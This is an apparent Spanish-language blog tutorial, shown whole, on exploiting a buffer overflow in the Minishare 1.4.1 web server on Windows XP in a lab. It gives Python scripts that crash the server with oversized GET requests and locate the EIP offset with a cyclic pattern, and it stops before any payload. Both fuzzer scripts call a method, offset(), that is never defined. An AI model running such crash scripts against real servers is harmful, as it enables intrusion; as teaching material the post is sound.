
El 20 de febrero de 2022 publique mi primer articulo sobre como abordar una explotación de *Buffer overflow* de manera exitosa, además de comprender los conceptos básicos para su desempeño en sistemas operativos GNU/Linux. 

Hoy traigo la parte dos de esta saga. En este articulo explicare de manera detallada la explotación de BoF en sistemas operativos Windows de 32 bits.

Llevaremos a cabo nuestras pruebas utilizando el software Minishare, concretamente la version 1.4.1.  Este programa actúa como servidor HTTP simple para intercambiar archivos de manera sencilla y eficaz entre múltiples usuarios en Red. 

Este software permite a atacantes obtener ejecución remota de comandos a través de una consulta HTTP malintencionada via GET, POST o incluso HEAD. Este problema surge debido a una verificación incorrecta del *input* del usuario.

En el laboratorio de hoy aprovecharemos esta vulnerabilidad para ganar acceso a la maquina victima a través de una petición GET preparada.

Material necesario:
- Windows XP (32 bits) [Victima]
- GNU/Linux (32/64 bits) [Atacante]
- Minishare 1.4.1 
- Immunity Debugger
	- mona.py 
- Python2 / Python3

Para esta prueba de concepto no tendremos activado ASLR (Aleatorización en las direcciones de memoria) y del mismo modo tampoco tendremos DEP (Prevención de ejecución de datos). 

Una vez con todo los requisitos preparados comenzaremos iniciando Immunity debugger y posteriormente Minishare en nuestro Windows XP, seguidamente pulsaremos CTRL + F1 para vincularnos con Minishare.

![2](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/7f0aad41-8f65-4132-9055-caf23359a755)

Este es el aspecto resultante (4 ventanas):
- Instrucciones de CPU [1 ventana]
- Registros y flags [2 ventana]
- Volcado de memoria [3 ventana]
- Pila [4 ventana]

![3](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/189a402e-d636-4c7f-bc1f-10f9259756e7)

En este punto ya podemos comenzar a trabajar. El primer paso será crear un *fuzzer* para determinar el numero de Bytes a enviar antes de que el programa corrompa.

Para ello me he creado un pequeño script en Python3:
```python3
#!/usr/bin/python3

import socket
from dataclasses import dataclass 
from sys import exit 
import signal
from pwn import *

def def_handler(sig,frame): # Función para controlar la interrupcion del script
    print("\nSaliendo...\n")
    exit(1)
signal.signal(signal.SIGINT, def_handler)

@dataclass 
class Fuzzer:
    http_method: str  
    buff: str
    http_header: str
    ip: str

    def fuzzerhttp(self):
        p1 = log.progress("Fuzzer")
        while True: # Bucle infinito para enviar mutliples bytes 
            self.buff = self.buff+"\x41"*100
            buff_final = self.http_method + self.buff + self.http_header
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creacion del socket 
                sock.connect((self.ip, 80))
                p1.status(f"Probing with {len(self.buff)} bytes")
                sock.send(buff_final.encode()) # Envio de X bytes a través del socket 
                sock.recv(1024)
                sock.close()
            except: # Exepcion para controlar el crasheo del programa 
                p1.success(f"Crashed with {len(self.buff)} bytes")
                exit()

fuzzer = Fuzzer("GET ", "", " HTTP/1.1\r\n\r\n", "192.168.1.140") # Definición de variables

def main():
    fuzzer.offset()

if __name__ == '__main__':
    main()
```

Este script enviara 100 caracteres A representados en HEX `\x41` cada x tiempo hasta dar con el numero maximo de Bytes en el que el programa corrompe.

Podemos ver mejor el funcionamiento de este script si solo enviamos 100 bytes e imprimimos el resultado.

```python3
#!/usr/bin/python3

import socket
from dataclasses import dataclass 
from sys import exit 
import signal
from pwn import *

def def_handler(sig,frame): # Función para controlar la interrupcion del script
    print("\nSaliendo...\n")
    exit(1)
signal.signal(signal.SIGINT, def_handler)

@dataclass 
class Fuzzer:
    http_method: str  
    buff: str
    http_header: str
    ip: str

    def fuzzerhttp(self):      
        self.buff = self.buff+"\x41"*100
        buff_final = self.http_method + self.buff + self.http_header
        print(buff_final)
fuzzer = Fuzzer("GET ", "", " HTTP/1.1\r\n\r\n", "192.168.1.140") # Definición de variables

def main():
    fuzzer.offset()

if __name__ == '__main__':
    main()
```
Resultado:

![4](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/938501f7-7663-49d8-8ca3-c861e1c08e0a)

Con el bucle infinito estariamos enviando 100 bytes constantemente hasta que se genere la exepcion y por consecuente que el programa corrompa.

A continuación un video de su funcionamiento:

https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/0ddf0518-21cb-4227-9294-2a6408873e5f

Segun el *fuzzer*, el programa corrompe entre 1700 y 1800 Bytes, pero esto no nos sirve, debemos conocer el numero de bytes exactos antes de sobreescribir el registro EIP. Para ello podemos generar una cadena preparada para determinar este numero. Esto lo podemos hacer con una utilidad llamada mona.py.

![image](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/89bbba8e-b093-4cfa-b08e-f6840fd6b3e1)

> **Nota:** 1800 -> N° de Bytes en que corrompe el programa

No es recomendable copiar directamente la cadena, una mejor manera de hacerlo es mediante el archivo `txt` que nos genera en `C:\Program Files\Immunity Inc\Immunity Debugger`.

![7](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/945997f0-926b-455a-b243-132f511900cc)

Lo abrimos y copiamos el ASCII.

![8](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/21e32387-8212-4c0e-85f6-fa98c241ab24)

Una vez tenemos esta cadena ya podremos calcular de manera exacta el offset. 

Con la misma base de antes he creado este script en Python3:

```python3
#!/usr/bin/python3

import socket
from dataclasses import dataclass 
from sys import exit 
import signal
from pwn import *

def def_handler(sig,frame):
    print("\nSaliendo...\n")
    exit(1)
signal.signal(signal.SIGINT, def_handler)

@dataclass 
class Offset:
    http_method: str
    buff: str
    http_header: str
    ip: str

    def offset_calc(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
        sock.connect((self.ip, 80))
        self.buff += 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9'
        buff_final = self.http_method + self.buff + self.http_header
        sock.send(buff_final.encode())
        sock.recv(1024)
        sock.close()

offset = Offset("GET ", "", " HTTP/1.1\r\n\r\n", "192.168.1.140")

def main():
    offset.offset_calc()

if __name__ == '__main__':
    main()
```

Este script simplemente se conecta al servidor y envia la cadena preparada que contiene 1800 Bytes.

Entonces como es de esperar cuando se envian 1800 Bytes el programa corrompe:

![9](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/808d44d0-727c-49a4-8911-76123f05a45f)

En este punto simplemente debemos copiar la direccion que se queda en EIP despues de que corrompa el programa.
Ahora podemos usar mona.py para calcular el numero de bytes necesarios antes de sobreescribir EIP.

![10](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/a1101caf-53c6-4bd9-bdfd-527504c378e2)



